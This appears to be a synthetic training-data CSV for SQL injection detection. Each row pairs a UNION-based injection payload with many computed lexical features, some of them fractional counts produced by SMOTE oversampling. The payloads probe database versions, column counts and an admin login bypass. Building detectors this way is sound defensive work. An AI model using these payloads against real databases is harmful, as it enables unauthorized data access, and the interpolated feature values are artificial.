id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000097,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000099,0.22316794199858478,74.4941189485177,31.252940525741153,4.350851698616227,44.98823789703538,2.252940525741155,17.0,10.252940525741154,0.6037239033143086,0.030316402106584706,0.22823743888131492,0.13772225569779173,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000098,attack,union," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.3583713633285195,71.7658862968963,33.0,4.435755685838372,40.0,2.4414715742240753,16.324414722672223,13.0,0.5577923838077505,0.033855451274496656,0.22706964018023384,0.18128252473751894,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000099,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.9203110247935135,94.33662179761505,27.0,3.750926950404747,45.892725430550904,3.4438963670641565,33.0,12.0,0.485793576377059,0.03671100965360577,0.3501633035775125,0.12733211039182274,0.0,1.0,2.0,0.0,1.0,1.443896367064157,0.0,3.5561036329358426,0.0,0.0,1.0,4.443896367064157,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000100,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000068,0.2517504469718314,77.0,26.380179575772797,3.9011559321181273,40.0,4.619820424227204,23.0,9.380179575772797,0.5194805194805194,0.05999766784710654,0.2987012987012987,0.12182051397107527,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000101,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000218,1.299007241222663,71.61181716649106,22.45520967305666,3.889899369245252,20.305908583245532,31.880559128151095,9.455209673056661,9.970139782037775,0.2762678297269415,0.44981497664988335,0.13259478232869681,0.1413224112944784,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.970139782037775,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000102,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000168,3.6155057808965076,76.6762947379424,30.941035790353922,4.431776942196027,33.41155368553088,23.676294737942406,12.794223157234558,6.794223157234558,0.4350949897512162,0.3081917142801102,0.1675156075533872,0.08919768841528647,3.735258947588481,0.0,0.26474105241151946,0.0,0.0,1.0,0.0,0.26474105241151924,0.0,0.0,1.0,1.5294821048230385,1.0,2.7755575615628914e-17,0.0,0.26474105241151935,0.0,1.0,0.26474105241151935,0.0,0.0,0.0,3.469446951953614e-18,1.2647410524115195,1.0,0.26474105241151935,0.0,0.7352589475884806,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2647410524115195
SMOTE_000103,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000002,2.705824155972303,88.8502282171655,27.57488589141725,3.9862962646134625,44.01210061996038,6.1497717828345015,25.550684651496496,13.137671162874124,0.49630225719321486,0.0696677415205785,0.2864218346688482,0.14760816661735843,3.0,0.0,2.0,0.7125570542913746,0.7125570542913746,1.7125570542913746,0.0,1.7125570542913746,0.0,0.0,1.2874429457086254,7.137671162874124,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.7125570542913746,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.712557054291374
SMOTE_000104,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,0.24006671210793287,80.51356223324383,26.902712446648767,3.896086278786618,41.805424893297534,2.902712446648767,24.902712446648767,10.902712446648767,0.5192770959325632,0.03599399309272558,0.30933733793818297,0.13539157303652824,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.9027124466487668,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.902712446648767
SMOTE_000105,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.7417813979459079,77.23168933286196,32.0,4.342226254284801,42.0,3.3719482221436596,18.859741110718296,13.0,0.5445710367110779,0.043489884553446684,0.24338137689633232,0.16855770183914315,3.0,0.0,2.0,0.0,1.0,1.3719482221436594,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000106,attack,union,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000298,2.7085971986241297,99.2542941509456,26.510682863002366,3.863809612967493,58.87180564397162,9.0,18.425219958983444,12.95726854799054,0.5941074228777012,0.09190329162996413,0.1840299901849262,0.12995929530740846,0.5106828630023652,0.4893171369976348,2.0,0.0,0.0,1.0,0.0,1.4893171369976348,0.0,0.0,6.957268547990539,3.510682863002365,0.5106828630023652,0.4893171369976348,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.5106828630023652,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.510682863002365
SMOTE_000107,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.09828318074099761,81.59861671399538,27.0,3.892379751710584,42.79815561866051,3.8004610953348728,25.0,10.0,0.5243252062204138,0.04665533243182585,0.3064424723912574,0.12257698895650296,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000108,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000215,0.7020667862160669,62.77921800566014,15.779218005660141,3.1832314930007577,34.0,1.0,18.0,9.779218005660141,0.5416043491570801,0.015929539681090593,0.2867317142596307,0.15573439690219854,0.0,0.7792180056601417,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.0,2.0,0.0,0.7792180056601417,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000109,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000300,1.763182182416184,71.81449973919173,21.46908328986529,3.6922627728801705,42.75266631892231,9.0,12.123666840538846,7.938166579730577,0.5940422195511423,0.1255400004535796,0.17026666969053064,0.11015111030474739,0.4690832898652885,0.0,0.0,0.0,0.0,1.0,0.0,0.5309167101347113,0.0,0.0,4.938166579730577,1.0,0.4690832898652886,2.7755575615628914e-17,0.0,1.0,0.0,1.0,0.5309167101347114,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000110,attack,union," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000091,0.11820780867257262,98.71077489127096,25.85538744563548,4.028169241140191,62.14461255436452,4.855387445635478,23.85538744563548,7.855387445635477,0.6296208059588971,0.04916479044689759,0.2416562282336155,0.0795581753605899,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.855387445635478,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000111,attack,union,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",nearest_attack_euclidean,R000285,0.08421210837941848,91.52010695291004,26.11997326177249,4.045721731804391,25.0,39.61608556232804,16.0,10.904021390582008,0.27355032098086485,0.43234836860171755,0.17507220542775354,0.119029104989664,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.904021390582008,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,0.0,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546393,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000113,attack,union,"1' union all select null,null,null--",nearest_attack_euclidean,R000240,2.2706300717545282,35.5270041559461,17.36497922026949,3.6800788963160107,20.324049871353225,4.310970908377286,5.891983376215592,5.000000000000001,0.5698124502492996,0.12275234011558424,0.16666935311109277,0.1407658565240234,1.0,0.0,2.472995844053898,0.0,0.0,0.0,0.0,0.47299584405389783,0.0,0.0,1.0540083118922043,2.472995844053898,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.4729958440538978,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000141,0.047365180616740506,69.18208366662408,32.0,4.424882592186393,40.0,2.0,15.182083666624074,12.0,0.5782022056594279,0.0289101102829714,0.21942702235977227,0.17346066169782837,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000115,attack,union,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",nearest_attack_euclidean,R000225,0.9741485794536006,82.73033052304268,27.26966947695731,4.004471630976779,25.0,29.078677907829245,20.381983138256132,8.269669476957311,0.30219537715602895,0.35161343104681636,0.2462000189492095,0.09999117284794526,0.0,0.26966947695731136,1.0,0.0,0.0,1.0,0.0,1.7303305230426886,0.0,0.0,3.2696694769573114,2.0,0.0,0.26966947695731136,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,union,"1""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000215,1.9153207538310364,68.36496638520688,15.999999999999998,3.1446445809860752,42.253794438779806,1.0,13.873102780610097,11.23806916581697,0.6101880101391174,0.014752513286297647,0.21124395995085887,0.16381551662372607,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.1746205561220195,0.0,0.0,6.063448609694952,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000117,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000255,0.04479368991421692,83.77704946064196,25.988265761086417,3.9540067846075977,24.929594566518514,27.953063044345676,21.90612608869135,8.988265761086419,0.2975567229068693,0.3337545624225388,0.2613588833911997,0.10732983127939222,0.0,0.011734238913581108,3.0,0.0,0.0,1.0,0.0,1.988265761086419,0.0,0.0,2.9882657610864185,4.0,0.0,0.011734238913581108,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,union," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000102,0.23553125937126357,78.6148233020673,31.61482330206729,4.20396425015157,42.0,4.0,22.0,10.61482330206729,0.5342709219917516,0.050882944951595385,0.2798561972337747,0.13498993582287824,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000119,attack,union,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",nearest_attack_euclidean,R000219,1.1515764354925364,77.28116568765236,28.0,4.047700667270385,25.0,24.921748531478553,19.539125734260722,7.820291421913092,0.32431952172193323,0.31947694093216317,0.255390517337993,0.10081302000791073,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.589854289043454,0.0,0.0,2.230437132869638,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000120,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000218,0.255932109141987,59.53267064171278,21.0,3.8604084060463433,14.0,28.0,8.532670641712777,9.0,0.23534357523233934,0.47068715046467857,0.14267697593933548,0.1512922983636467,0.9112215597145372,0.0,1.0,0.0,0.0,0.0,0.0,1.0887784402854628,0.0,0.0,5.0,1.0,0.9112215597145371,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.2008322947814671,82.77678390687117,27.0,3.906481673011403,44.36904520916157,3.4077386977096085,25.0,10.0,0.5357536357809374,0.041287433698852655,0.30211352180015,0.12084540872006,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000122,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000141,0.00508828293369607,69.00611492975145,32.00611492975145,4.431049862861317,40.0,2.0,15.0,12.006114929751444,0.5796595036873586,0.028982975184367918,0.2173723138827595,0.17398520724551392,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.006114929751444,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000123,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.1864360739571775,82.13553254098058,27.0,3.8988062969268262,43.514043387974105,3.6214891530064737,25.0,10.0,0.5295333844363196,0.04420906690617313,0.3044696776125052,0.12178787104500208,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000124,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.11649685268215816,83.29044865441234,27.0,3.9126299174105275,45.053931539216464,3.236517115195884,25.0,10.0,0.5407362744255166,0.03894710342639876,0.3002261586772033,0.12009046347088131,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000125,attack,union," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000062,0.01866101504202119,74.97634162076304,31.0,4.369696342678219,44.0,2.0,17.0,11.976341620763037,0.5868567979335939,0.026675308996981534,0.22674012647434308,0.15972776659508153,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.976341620763038,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000126,attack,union," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.2971645905229649,79.11626127079256,26.446504508317027,3.8962366053658486,40.89300901663405,3.5534954916829724,24.223252254158513,10.446504508317028,0.5166827699205674,0.04521279012482261,0.3062439612797872,0.13186047867482273,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.223252254158514,0.0,2.7755575615628914e-17,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000127,attack,union," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000093,0.2730872682594432,109.43558949944662,27.145196499815537,3.936187316398688,62.580785999262154,4.854803500184462,32.0,10.0,0.5717807277976642,0.04439675901235855,0.29243620052569697,0.0913863126642803,0.0,0.0,2.0,0.0,1.8548035001844616,2.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000128,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000006,0.02751890442348567,70.08926449857424,31.017852899714846,4.418450683623461,40.0,2.017852899714848,15.035705799429696,13.035705799429696,0.5707484609632438,0.028775461711026823,0.21450675018694573,0.18596932713878356,3.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.035705799429696,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
